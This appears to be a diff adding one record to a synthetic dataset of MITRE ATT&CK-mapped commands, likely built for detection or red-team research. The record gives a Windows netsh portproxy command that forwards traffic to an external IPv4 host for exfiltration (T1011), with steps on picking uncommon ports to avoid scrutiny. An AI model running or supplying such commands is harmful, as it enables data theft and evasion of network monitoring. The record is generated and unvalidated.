@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface portproxy add v6tov4 listenaddress=::1 listenport=49205 connectaddress=203.0.113.77 connectport=49206",
+  "explanation": "Creates an IPv6-to-IPv4 port proxy on loopback, redirecting data sent to an IPv6 port to a remote IPv4 host/port, supporting alternate-medium exfiltration (T1011).",
+  "rationale_steps": [
+    "Bind an IPv6 localhost listener and forward to an external IPv4 endpoint.",
+    "Select uncommon ports in the 49xxx range to reduce scrutiny.",
+    "Bridge IPv6-originated traffic into IPv4 egress outside normal monitored paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-6d9ac432",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
